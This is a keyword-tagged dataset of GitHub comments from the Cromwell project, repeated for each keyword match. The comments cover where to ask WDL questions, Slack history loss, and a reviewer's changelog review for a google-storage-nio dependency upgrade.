https://github.com/broadinstitute/cromwell/issues/6801#issuecomment-1182147447:58,Availability,avail,available,58,"I would suggest the `wdl` tag on Stack Overflow, which is available everywhere, permanent, and easy to search. https://bioinformatics.stackexchange.com/questions/tagged/wdl",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6801#issuecomment-1182147447
https://github.com/broadinstitute/cromwell/issues/6801#issuecomment-1212432763:568,Deployability,update,updates,568,"Slack's changes to the free plan will leave the Cromwell and OpenWDL Slacks almost unusable pretty soon. Is there any plan to mirror their contents before the majority of the messages are hidden on September 1st of this year? Vast majority of messages there are >90 days old and both workspaces are on a free plan. > Instead of a 10,000-message limit and 5 GB of storage, we are giving full access to the past 90 days of message history and file storage, so you’ll never have to guess when your team will hit your limit. ; https://slack.com/blog/news/pricing-and-plan-updates",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6801#issuecomment-1212432763
https://github.com/broadinstitute/cromwell/issues/6801#issuecomment-1212432763:175,Integrability,message,messages,175,"Slack's changes to the free plan will leave the Cromwell and OpenWDL Slacks almost unusable pretty soon. Is there any plan to mirror their contents before the majority of the messages are hidden on September 1st of this year? Vast majority of messages there are >90 days old and both workspaces are on a free plan. > Instead of a 10,000-message limit and 5 GB of storage, we are giving full access to the past 90 days of message history and file storage, so you’ll never have to guess when your team will hit your limit. ; https://slack.com/blog/news/pricing-and-plan-updates",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6801#issuecomment-1212432763
https://github.com/broadinstitute/cromwell/issues/6801#issuecomment-1212432763:243,Integrability,message,messages,243,"Slack's changes to the free plan will leave the Cromwell and OpenWDL Slacks almost unusable pretty soon. Is there any plan to mirror their contents before the majority of the messages are hidden on September 1st of this year? Vast majority of messages there are >90 days old and both workspaces are on a free plan. > Instead of a 10,000-message limit and 5 GB of storage, we are giving full access to the past 90 days of message history and file storage, so you’ll never have to guess when your team will hit your limit. ; https://slack.com/blog/news/pricing-and-plan-updates",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6801#issuecomment-1212432763
https://github.com/broadinstitute/cromwell/issues/6801#issuecomment-1212432763:337,Integrability,message,message,337,"Slack's changes to the free plan will leave the Cromwell and OpenWDL Slacks almost unusable pretty soon. Is there any plan to mirror their contents before the majority of the messages are hidden on September 1st of this year? Vast majority of messages there are >90 days old and both workspaces are on a free plan. > Instead of a 10,000-message limit and 5 GB of storage, we are giving full access to the past 90 days of message history and file storage, so you’ll never have to guess when your team will hit your limit. ; https://slack.com/blog/news/pricing-and-plan-updates",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6801#issuecomment-1212432763
https://github.com/broadinstitute/cromwell/issues/6801#issuecomment-1212432763:421,Integrability,message,message,421,"Slack's changes to the free plan will leave the Cromwell and OpenWDL Slacks almost unusable pretty soon. Is there any plan to mirror their contents before the majority of the messages are hidden on September 1st of this year? Vast majority of messages there are >90 days old and both workspaces are on a free plan. > Instead of a 10,000-message limit and 5 GB of storage, we are giving full access to the past 90 days of message history and file storage, so you’ll never have to guess when your team will hit your limit. ; https://slack.com/blog/news/pricing-and-plan-updates",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6801#issuecomment-1212432763
https://github.com/broadinstitute/cromwell/issues/6801#issuecomment-1212432763:391,Security,access,access,391,"Slack's changes to the free plan will leave the Cromwell and OpenWDL Slacks almost unusable pretty soon. Is there any plan to mirror their contents before the majority of the messages are hidden on September 1st of this year? Vast majority of messages there are >90 days old and both workspaces are on a free plan. > Instead of a 10,000-message limit and 5 GB of storage, we are giving full access to the past 90 days of message history and file storage, so you’ll never have to guess when your team will hit your limit. ; https://slack.com/blog/news/pricing-and-plan-updates",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6801#issuecomment-1212432763
https://github.com/broadinstitute/cromwell/pull/6804#issuecomment-1184386452:2429,Availability,rollback,rollback,2429,". In fact, browsing the release notes, I found only a handful that mentioned changes to storage NIO. These all looked very innocent to me.; * After `0.120.0`, the library code moved to its own [repo](https://github.com/googleapis/java-storage-nio). Releases there have been less frequent and more irregularly scheduled, but still largely consist of dependency updates. (It's possible that _those_ dependency updates introduce unexpected behaviors in `java-storage-nio`, but there's only so much we can audit).; * Cromwell was briefly running with `0.123.8` until the bug mentioned here was discovered. Not knowing when that bug was introduced, we rolled all the way back. Now, we are pretty confident that it was introduced in [`0.122.0`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.122.0) and fixed in [`0.123.13`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.123.13).; * Again looking at releases that are not just dependency updates, nearly all of the changes look very innocent to me. In fact, updating to at least [`0.123.23`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.123.23) will give us the benefit of a [fix](https://github.com/googleapis/java-storage-nio/pull/841) to a requester-pays problem that we encountered ourselves.; * There's only one other post-`0.120.0` [change](https://github.com/googleapis/java-storage-nio/pull/774) (in [`0.123.18`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.123.18)) that raises my eyebrows a little. It's _probably_ fine, but there is new usage of `StorageOptionsUtil.getDefaultInstance()` for which I don't know the lifecycle or how else it's used. This is the type of thing that I'd watch out for in terms of thread safety, which is the root of the problem that caused us to rollback before. In summary, it's probably safe to go all the way to the most recent version. In fact, my gut feeling is that the risk is low enough to be outweighed by the benefit of being up-to-date.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6804#issuecomment-1184386452
https://github.com/broadinstitute/cromwell/pull/6804#issuecomment-1184386452:51,Deployability,update,updates,51,"Documenting my review process here. For dependency updates, I like to review the changelog. In this case, we're going from `0.61.0-alpha` to `0.124.8` which is a large jump, but that doesn't tell the whole story. * This looks like a lot of releases to check. For sure, checking every release manually is not practical; we'll have to rely on their release notes.; * Until `0.120.0`, this library used to be included in a [monorepo-ish repo of Java libraries](https://github.com/googleapis/google-cloud-java) which appears to have had a regular 2-week release cycle. Not every release had changes to the `google-storage-nio` library. In fact, browsing the release notes, I found only a handful that mentioned changes to storage NIO. These all looked very innocent to me.; * After `0.120.0`, the library code moved to its own [repo](https://github.com/googleapis/java-storage-nio). Releases there have been less frequent and more irregularly scheduled, but still largely consist of dependency updates. (It's possible that _those_ dependency updates introduce unexpected behaviors in `java-storage-nio`, but there's only so much we can audit).; * Cromwell was briefly running with `0.123.8` until the bug mentioned here was discovered. Not knowing when that bug was introduced, we rolled all the way back. Now, we are pretty confident that it was introduced in [`0.122.0`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.122.0) and fixed in [`0.123.13`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.123.13).; * Again looking at releases that are not just dependency updates, nearly all of the changes look very innocent to me. In fact, updating to at least [`0.123.23`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.123.23) will give us the benefit of a [fix](https://github.com/googleapis/java-storage-nio/pull/841) to a requester-pays problem that we encountered ourselves.; * There's only one other post-`0.120.0` [change](https://github.com/googleapis",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6804#issuecomment-1184386452
https://github.com/broadinstitute/cromwell/pull/6804#issuecomment-1184386452:240,Deployability,release,releases,240,"Documenting my review process here. For dependency updates, I like to review the changelog. In this case, we're going from `0.61.0-alpha` to `0.124.8` which is a large jump, but that doesn't tell the whole story. * This looks like a lot of releases to check. For sure, checking every release manually is not practical; we'll have to rely on their release notes.; * Until `0.120.0`, this library used to be included in a [monorepo-ish repo of Java libraries](https://github.com/googleapis/google-cloud-java) which appears to have had a regular 2-week release cycle. Not every release had changes to the `google-storage-nio` library. In fact, browsing the release notes, I found only a handful that mentioned changes to storage NIO. These all looked very innocent to me.; * After `0.120.0`, the library code moved to its own [repo](https://github.com/googleapis/java-storage-nio). Releases there have been less frequent and more irregularly scheduled, but still largely consist of dependency updates. (It's possible that _those_ dependency updates introduce unexpected behaviors in `java-storage-nio`, but there's only so much we can audit).; * Cromwell was briefly running with `0.123.8` until the bug mentioned here was discovered. Not knowing when that bug was introduced, we rolled all the way back. Now, we are pretty confident that it was introduced in [`0.122.0`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.122.0) and fixed in [`0.123.13`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.123.13).; * Again looking at releases that are not just dependency updates, nearly all of the changes look very innocent to me. In fact, updating to at least [`0.123.23`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.123.23) will give us the benefit of a [fix](https://github.com/googleapis/java-storage-nio/pull/841) to a requester-pays problem that we encountered ourselves.; * There's only one other post-`0.120.0` [change](https://github.com/googleapis",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6804#issuecomment-1184386452
https://github.com/broadinstitute/cromwell/pull/6804#issuecomment-1184386452:284,Deployability,release,release,284,"Documenting my review process here. For dependency updates, I like to review the changelog. In this case, we're going from `0.61.0-alpha` to `0.124.8` which is a large jump, but that doesn't tell the whole story. * This looks like a lot of releases to check. For sure, checking every release manually is not practical; we'll have to rely on their release notes.; * Until `0.120.0`, this library used to be included in a [monorepo-ish repo of Java libraries](https://github.com/googleapis/google-cloud-java) which appears to have had a regular 2-week release cycle. Not every release had changes to the `google-storage-nio` library. In fact, browsing the release notes, I found only a handful that mentioned changes to storage NIO. These all looked very innocent to me.; * After `0.120.0`, the library code moved to its own [repo](https://github.com/googleapis/java-storage-nio). Releases there have been less frequent and more irregularly scheduled, but still largely consist of dependency updates. (It's possible that _those_ dependency updates introduce unexpected behaviors in `java-storage-nio`, but there's only so much we can audit).; * Cromwell was briefly running with `0.123.8` until the bug mentioned here was discovered. Not knowing when that bug was introduced, we rolled all the way back. Now, we are pretty confident that it was introduced in [`0.122.0`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.122.0) and fixed in [`0.123.13`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.123.13).; * Again looking at releases that are not just dependency updates, nearly all of the changes look very innocent to me. In fact, updating to at least [`0.123.23`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.123.23) will give us the benefit of a [fix](https://github.com/googleapis/java-storage-nio/pull/841) to a requester-pays problem that we encountered ourselves.; * There's only one other post-`0.120.0` [change](https://github.com/googleapis",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6804#issuecomment-1184386452
https://github.com/broadinstitute/cromwell/pull/6804#issuecomment-1184386452:347,Deployability,release,release,347,"Documenting my review process here. For dependency updates, I like to review the changelog. In this case, we're going from `0.61.0-alpha` to `0.124.8` which is a large jump, but that doesn't tell the whole story. * This looks like a lot of releases to check. For sure, checking every release manually is not practical; we'll have to rely on their release notes.; * Until `0.120.0`, this library used to be included in a [monorepo-ish repo of Java libraries](https://github.com/googleapis/google-cloud-java) which appears to have had a regular 2-week release cycle. Not every release had changes to the `google-storage-nio` library. In fact, browsing the release notes, I found only a handful that mentioned changes to storage NIO. These all looked very innocent to me.; * After `0.120.0`, the library code moved to its own [repo](https://github.com/googleapis/java-storage-nio). Releases there have been less frequent and more irregularly scheduled, but still largely consist of dependency updates. (It's possible that _those_ dependency updates introduce unexpected behaviors in `java-storage-nio`, but there's only so much we can audit).; * Cromwell was briefly running with `0.123.8` until the bug mentioned here was discovered. Not knowing when that bug was introduced, we rolled all the way back. Now, we are pretty confident that it was introduced in [`0.122.0`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.122.0) and fixed in [`0.123.13`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.123.13).; * Again looking at releases that are not just dependency updates, nearly all of the changes look very innocent to me. In fact, updating to at least [`0.123.23`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.123.23) will give us the benefit of a [fix](https://github.com/googleapis/java-storage-nio/pull/841) to a requester-pays problem that we encountered ourselves.; * There's only one other post-`0.120.0` [change](https://github.com/googleapis",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6804#issuecomment-1184386452
https://github.com/broadinstitute/cromwell/pull/6804#issuecomment-1184386452:550,Deployability,release,release,550,"Documenting my review process here. For dependency updates, I like to review the changelog. In this case, we're going from `0.61.0-alpha` to `0.124.8` which is a large jump, but that doesn't tell the whole story. * This looks like a lot of releases to check. For sure, checking every release manually is not practical; we'll have to rely on their release notes.; * Until `0.120.0`, this library used to be included in a [monorepo-ish repo of Java libraries](https://github.com/googleapis/google-cloud-java) which appears to have had a regular 2-week release cycle. Not every release had changes to the `google-storage-nio` library. In fact, browsing the release notes, I found only a handful that mentioned changes to storage NIO. These all looked very innocent to me.; * After `0.120.0`, the library code moved to its own [repo](https://github.com/googleapis/java-storage-nio). Releases there have been less frequent and more irregularly scheduled, but still largely consist of dependency updates. (It's possible that _those_ dependency updates introduce unexpected behaviors in `java-storage-nio`, but there's only so much we can audit).; * Cromwell was briefly running with `0.123.8` until the bug mentioned here was discovered. Not knowing when that bug was introduced, we rolled all the way back. Now, we are pretty confident that it was introduced in [`0.122.0`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.122.0) and fixed in [`0.123.13`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.123.13).; * Again looking at releases that are not just dependency updates, nearly all of the changes look very innocent to me. In fact, updating to at least [`0.123.23`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.123.23) will give us the benefit of a [fix](https://github.com/googleapis/java-storage-nio/pull/841) to a requester-pays problem that we encountered ourselves.; * There's only one other post-`0.120.0` [change](https://github.com/googleapis",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6804#issuecomment-1184386452
https://github.com/broadinstitute/cromwell/pull/6804#issuecomment-1184386452:575,Deployability,release,release,575,"Documenting my review process here. For dependency updates, I like to review the changelog. In this case, we're going from `0.61.0-alpha` to `0.124.8` which is a large jump, but that doesn't tell the whole story. * This looks like a lot of releases to check. For sure, checking every release manually is not practical; we'll have to rely on their release notes.; * Until `0.120.0`, this library used to be included in a [monorepo-ish repo of Java libraries](https://github.com/googleapis/google-cloud-java) which appears to have had a regular 2-week release cycle. Not every release had changes to the `google-storage-nio` library. In fact, browsing the release notes, I found only a handful that mentioned changes to storage NIO. These all looked very innocent to me.; * After `0.120.0`, the library code moved to its own [repo](https://github.com/googleapis/java-storage-nio). Releases there have been less frequent and more irregularly scheduled, but still largely consist of dependency updates. (It's possible that _those_ dependency updates introduce unexpected behaviors in `java-storage-nio`, but there's only so much we can audit).; * Cromwell was briefly running with `0.123.8` until the bug mentioned here was discovered. Not knowing when that bug was introduced, we rolled all the way back. Now, we are pretty confident that it was introduced in [`0.122.0`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.122.0) and fixed in [`0.123.13`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.123.13).; * Again looking at releases that are not just dependency updates, nearly all of the changes look very innocent to me. In fact, updating to at least [`0.123.23`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.123.23) will give us the benefit of a [fix](https://github.com/googleapis/java-storage-nio/pull/841) to a requester-pays problem that we encountered ourselves.; * There's only one other post-`0.120.0` [change](https://github.com/googleapis",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6804#issuecomment-1184386452
https://github.com/broadinstitute/cromwell/pull/6804#issuecomment-1184386452:654,Deployability,release,release,654,"Documenting my review process here. For dependency updates, I like to review the changelog. In this case, we're going from `0.61.0-alpha` to `0.124.8` which is a large jump, but that doesn't tell the whole story. * This looks like a lot of releases to check. For sure, checking every release manually is not practical; we'll have to rely on their release notes.; * Until `0.120.0`, this library used to be included in a [monorepo-ish repo of Java libraries](https://github.com/googleapis/google-cloud-java) which appears to have had a regular 2-week release cycle. Not every release had changes to the `google-storage-nio` library. In fact, browsing the release notes, I found only a handful that mentioned changes to storage NIO. These all looked very innocent to me.; * After `0.120.0`, the library code moved to its own [repo](https://github.com/googleapis/java-storage-nio). Releases there have been less frequent and more irregularly scheduled, but still largely consist of dependency updates. (It's possible that _those_ dependency updates introduce unexpected behaviors in `java-storage-nio`, but there's only so much we can audit).; * Cromwell was briefly running with `0.123.8` until the bug mentioned here was discovered. Not knowing when that bug was introduced, we rolled all the way back. Now, we are pretty confident that it was introduced in [`0.122.0`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.122.0) and fixed in [`0.123.13`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.123.13).; * Again looking at releases that are not just dependency updates, nearly all of the changes look very innocent to me. In fact, updating to at least [`0.123.23`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.123.23) will give us the benefit of a [fix](https://github.com/googleapis/java-storage-nio/pull/841) to a requester-pays problem that we encountered ourselves.; * There's only one other post-`0.120.0` [change](https://github.com/googleapis",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6804#issuecomment-1184386452
https://github.com/broadinstitute/cromwell/pull/6804#issuecomment-1184386452:879,Deployability,Release,Releases,879,"Documenting my review process here. For dependency updates, I like to review the changelog. In this case, we're going from `0.61.0-alpha` to `0.124.8` which is a large jump, but that doesn't tell the whole story. * This looks like a lot of releases to check. For sure, checking every release manually is not practical; we'll have to rely on their release notes.; * Until `0.120.0`, this library used to be included in a [monorepo-ish repo of Java libraries](https://github.com/googleapis/google-cloud-java) which appears to have had a regular 2-week release cycle. Not every release had changes to the `google-storage-nio` library. In fact, browsing the release notes, I found only a handful that mentioned changes to storage NIO. These all looked very innocent to me.; * After `0.120.0`, the library code moved to its own [repo](https://github.com/googleapis/java-storage-nio). Releases there have been less frequent and more irregularly scheduled, but still largely consist of dependency updates. (It's possible that _those_ dependency updates introduce unexpected behaviors in `java-storage-nio`, but there's only so much we can audit).; * Cromwell was briefly running with `0.123.8` until the bug mentioned here was discovered. Not knowing when that bug was introduced, we rolled all the way back. Now, we are pretty confident that it was introduced in [`0.122.0`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.122.0) and fixed in [`0.123.13`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.123.13).; * Again looking at releases that are not just dependency updates, nearly all of the changes look very innocent to me. In fact, updating to at least [`0.123.23`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.123.23) will give us the benefit of a [fix](https://github.com/googleapis/java-storage-nio/pull/841) to a requester-pays problem that we encountered ourselves.; * There's only one other post-`0.120.0` [change](https://github.com/googleapis",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6804#issuecomment-1184386452
https://github.com/broadinstitute/cromwell/pull/6804#issuecomment-1184386452:990,Deployability,update,updates,990,"Documenting my review process here. For dependency updates, I like to review the changelog. In this case, we're going from `0.61.0-alpha` to `0.124.8` which is a large jump, but that doesn't tell the whole story. * This looks like a lot of releases to check. For sure, checking every release manually is not practical; we'll have to rely on their release notes.; * Until `0.120.0`, this library used to be included in a [monorepo-ish repo of Java libraries](https://github.com/googleapis/google-cloud-java) which appears to have had a regular 2-week release cycle. Not every release had changes to the `google-storage-nio` library. In fact, browsing the release notes, I found only a handful that mentioned changes to storage NIO. These all looked very innocent to me.; * After `0.120.0`, the library code moved to its own [repo](https://github.com/googleapis/java-storage-nio). Releases there have been less frequent and more irregularly scheduled, but still largely consist of dependency updates. (It's possible that _those_ dependency updates introduce unexpected behaviors in `java-storage-nio`, but there's only so much we can audit).; * Cromwell was briefly running with `0.123.8` until the bug mentioned here was discovered. Not knowing when that bug was introduced, we rolled all the way back. Now, we are pretty confident that it was introduced in [`0.122.0`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.122.0) and fixed in [`0.123.13`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.123.13).; * Again looking at releases that are not just dependency updates, nearly all of the changes look very innocent to me. In fact, updating to at least [`0.123.23`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.123.23) will give us the benefit of a [fix](https://github.com/googleapis/java-storage-nio/pull/841) to a requester-pays problem that we encountered ourselves.; * There's only one other post-`0.120.0` [change](https://github.com/googleapis",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6804#issuecomment-1184386452
https://github.com/broadinstitute/cromwell/pull/6804#issuecomment-1184386452:1038,Deployability,update,updates,1038,"o review the changelog. In this case, we're going from `0.61.0-alpha` to `0.124.8` which is a large jump, but that doesn't tell the whole story. * This looks like a lot of releases to check. For sure, checking every release manually is not practical; we'll have to rely on their release notes.; * Until `0.120.0`, this library used to be included in a [monorepo-ish repo of Java libraries](https://github.com/googleapis/google-cloud-java) which appears to have had a regular 2-week release cycle. Not every release had changes to the `google-storage-nio` library. In fact, browsing the release notes, I found only a handful that mentioned changes to storage NIO. These all looked very innocent to me.; * After `0.120.0`, the library code moved to its own [repo](https://github.com/googleapis/java-storage-nio). Releases there have been less frequent and more irregularly scheduled, but still largely consist of dependency updates. (It's possible that _those_ dependency updates introduce unexpected behaviors in `java-storage-nio`, but there's only so much we can audit).; * Cromwell was briefly running with `0.123.8` until the bug mentioned here was discovered. Not knowing when that bug was introduced, we rolled all the way back. Now, we are pretty confident that it was introduced in [`0.122.0`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.122.0) and fixed in [`0.123.13`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.123.13).; * Again looking at releases that are not just dependency updates, nearly all of the changes look very innocent to me. In fact, updating to at least [`0.123.23`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.123.23) will give us the benefit of a [fix](https://github.com/googleapis/java-storage-nio/pull/841) to a requester-pays problem that we encountered ourselves.; * There's only one other post-`0.120.0` [change](https://github.com/googleapis/java-storage-nio/pull/774) (in [`0.123.18`](https://github.com/goog",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6804#issuecomment-1184386452
https://github.com/broadinstitute/cromwell/pull/6804#issuecomment-1184386452:1416,Deployability,release,releases,1416,"cluded in a [monorepo-ish repo of Java libraries](https://github.com/googleapis/google-cloud-java) which appears to have had a regular 2-week release cycle. Not every release had changes to the `google-storage-nio` library. In fact, browsing the release notes, I found only a handful that mentioned changes to storage NIO. These all looked very innocent to me.; * After `0.120.0`, the library code moved to its own [repo](https://github.com/googleapis/java-storage-nio). Releases there have been less frequent and more irregularly scheduled, but still largely consist of dependency updates. (It's possible that _those_ dependency updates introduce unexpected behaviors in `java-storage-nio`, but there's only so much we can audit).; * Cromwell was briefly running with `0.123.8` until the bug mentioned here was discovered. Not knowing when that bug was introduced, we rolled all the way back. Now, we are pretty confident that it was introduced in [`0.122.0`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.122.0) and fixed in [`0.123.13`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.123.13).; * Again looking at releases that are not just dependency updates, nearly all of the changes look very innocent to me. In fact, updating to at least [`0.123.23`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.123.23) will give us the benefit of a [fix](https://github.com/googleapis/java-storage-nio/pull/841) to a requester-pays problem that we encountered ourselves.; * There's only one other post-`0.120.0` [change](https://github.com/googleapis/java-storage-nio/pull/774) (in [`0.123.18`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.123.18)) that raises my eyebrows a little. It's _probably_ fine, but there is new usage of `StorageOptionsUtil.getDefaultInstance()` for which I don't know the lifecycle or how else it's used. This is the type of thing that I'd watch out for in terms of thread safety, which is the root of the probl",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6804#issuecomment-1184386452
https://github.com/broadinstitute/cromwell/pull/6804#issuecomment-1184386452:1512,Deployability,release,releases,1512,"a) which appears to have had a regular 2-week release cycle. Not every release had changes to the `google-storage-nio` library. In fact, browsing the release notes, I found only a handful that mentioned changes to storage NIO. These all looked very innocent to me.; * After `0.120.0`, the library code moved to its own [repo](https://github.com/googleapis/java-storage-nio). Releases there have been less frequent and more irregularly scheduled, but still largely consist of dependency updates. (It's possible that _those_ dependency updates introduce unexpected behaviors in `java-storage-nio`, but there's only so much we can audit).; * Cromwell was briefly running with `0.123.8` until the bug mentioned here was discovered. Not knowing when that bug was introduced, we rolled all the way back. Now, we are pretty confident that it was introduced in [`0.122.0`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.122.0) and fixed in [`0.123.13`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.123.13).; * Again looking at releases that are not just dependency updates, nearly all of the changes look very innocent to me. In fact, updating to at least [`0.123.23`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.123.23) will give us the benefit of a [fix](https://github.com/googleapis/java-storage-nio/pull/841) to a requester-pays problem that we encountered ourselves.; * There's only one other post-`0.120.0` [change](https://github.com/googleapis/java-storage-nio/pull/774) (in [`0.123.18`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.123.18)) that raises my eyebrows a little. It's _probably_ fine, but there is new usage of `StorageOptionsUtil.getDefaultInstance()` for which I don't know the lifecycle or how else it's used. This is the type of thing that I'd watch out for in terms of thread safety, which is the root of the problem that caused us to rollback before. In summary, it's probably safe to go all the way to the mo",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6804#issuecomment-1184386452
https://github.com/broadinstitute/cromwell/pull/6804#issuecomment-1184386452:1557,Deployability,release,releases,1557,"to the `google-storage-nio` library. In fact, browsing the release notes, I found only a handful that mentioned changes to storage NIO. These all looked very innocent to me.; * After `0.120.0`, the library code moved to its own [repo](https://github.com/googleapis/java-storage-nio). Releases there have been less frequent and more irregularly scheduled, but still largely consist of dependency updates. (It's possible that _those_ dependency updates introduce unexpected behaviors in `java-storage-nio`, but there's only so much we can audit).; * Cromwell was briefly running with `0.123.8` until the bug mentioned here was discovered. Not knowing when that bug was introduced, we rolled all the way back. Now, we are pretty confident that it was introduced in [`0.122.0`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.122.0) and fixed in [`0.123.13`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.123.13).; * Again looking at releases that are not just dependency updates, nearly all of the changes look very innocent to me. In fact, updating to at least [`0.123.23`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.123.23) will give us the benefit of a [fix](https://github.com/googleapis/java-storage-nio/pull/841) to a requester-pays problem that we encountered ourselves.; * There's only one other post-`0.120.0` [change](https://github.com/googleapis/java-storage-nio/pull/774) (in [`0.123.18`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.123.18)) that raises my eyebrows a little. It's _probably_ fine, but there is new usage of `StorageOptionsUtil.getDefaultInstance()` for which I don't know the lifecycle or how else it's used. This is the type of thing that I'd watch out for in terms of thread safety, which is the root of the problem that caused us to rollback before. In summary, it's probably safe to go all the way to the most recent version. In fact, my gut feeling is that the risk is low enough to be outweighed b",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6804#issuecomment-1184386452
https://github.com/broadinstitute/cromwell/pull/6804#issuecomment-1184386452:1595,Deployability,update,updates,1595,"to the `google-storage-nio` library. In fact, browsing the release notes, I found only a handful that mentioned changes to storage NIO. These all looked very innocent to me.; * After `0.120.0`, the library code moved to its own [repo](https://github.com/googleapis/java-storage-nio). Releases there have been less frequent and more irregularly scheduled, but still largely consist of dependency updates. (It's possible that _those_ dependency updates introduce unexpected behaviors in `java-storage-nio`, but there's only so much we can audit).; * Cromwell was briefly running with `0.123.8` until the bug mentioned here was discovered. Not knowing when that bug was introduced, we rolled all the way back. Now, we are pretty confident that it was introduced in [`0.122.0`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.122.0) and fixed in [`0.123.13`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.123.13).; * Again looking at releases that are not just dependency updates, nearly all of the changes look very innocent to me. In fact, updating to at least [`0.123.23`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.123.23) will give us the benefit of a [fix](https://github.com/googleapis/java-storage-nio/pull/841) to a requester-pays problem that we encountered ourselves.; * There's only one other post-`0.120.0` [change](https://github.com/googleapis/java-storage-nio/pull/774) (in [`0.123.18`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.123.18)) that raises my eyebrows a little. It's _probably_ fine, but there is new usage of `StorageOptionsUtil.getDefaultInstance()` for which I don't know the lifecycle or how else it's used. This is the type of thing that I'd watch out for in terms of thread safety, which is the root of the problem that caused us to rollback before. In summary, it's probably safe to go all the way to the most recent version. In fact, my gut feeling is that the risk is low enough to be outweighed 